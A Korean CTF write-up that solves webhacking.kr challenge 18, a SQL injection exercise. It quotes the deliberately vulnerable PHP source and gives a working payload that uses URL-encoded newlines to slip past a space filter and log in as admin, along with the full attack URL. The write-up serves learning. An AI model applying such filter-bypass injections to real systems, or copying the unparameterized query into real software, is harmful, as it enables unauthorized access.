# sql injection

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 18</title>
<style type="text/css">
body { background:black; color:white; font-size:10pt; }
input { background:silver; }
a { color:lightgreen; }
</style>
</head>
<body>
<br><br>
<center><h1>SQL INJECTION</h1>
<form method=get action=index.php>
<table border=0 align=center cellpadding=10 cellspacing=0>
<tr><td><input type=text name=no></td><td><input type=submit></td></tr>
</table>
</form>
<a style=background:gray;color:black;width:100;font-size:9pt;><b>RESULT</b><br>
<?php
if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/ |\/|\(|\)|\||&|select|from|0x/i",$_GET['no'])) exit("no hack");
  $result = mysqli_fetch_array(mysqli_query($db,"select id from chall18 where id='guest' and no=$_GET[no]")); // admin's no = 2

  if($result['id']=="guest") echo "hi guest";
  if($result['id']=="admin"){
    solve(18);
    echo "hi admin!";
  }
}
?>
</a>
<br><br><a href=?view_source=1>view-source</a>
</center>
</body>
</html>
```

```sql
SELECT id FROM chall18
WHERE
id='guest' AND no=입력값
```

이러한 쿼리로 guest의 no를 받아서 로그인이 된다. 
목표는 admin으로 로그인을 하는 것. admin은 no=2이다. 

그냥 no=2를 하면, id='guest'로 되어있어서 guest로 로그인이 된다. 
따라서 다음과 같은 쿼리를 작성해야한다. 

```sql
SELECT id FROM chall18
WHERE
id='guest' AND no=아무거나 OR no=2
```

인풋값으로 `123 OR no=2`를 입력하면 white space 필터링에 걸린다. 

이걸 우회하기 위해, `123%0aOR%0ano=2`를 넣는다. `%0a`는 라인변경(\n)를 의미하는 URL인코딩 값이다. 
URL인코드가 2번되는 것을 방지하기 위해, URL에 해당 payload를 직접넣는다. 

```html
https://webhacking.kr/challenge/web-32/index.php?no=123%0aOR%0ano=2
```

그럼 해결!

> 인풋값이 SQL쿼리에 쓰이는 경우에 필터링이 항상 걸려있다. 
>
> 따라서 SQL injection공격을 위해서는 필터링을 우회하는 방법을 알아야한다. 
>
> https://g-idler.tistory.com/61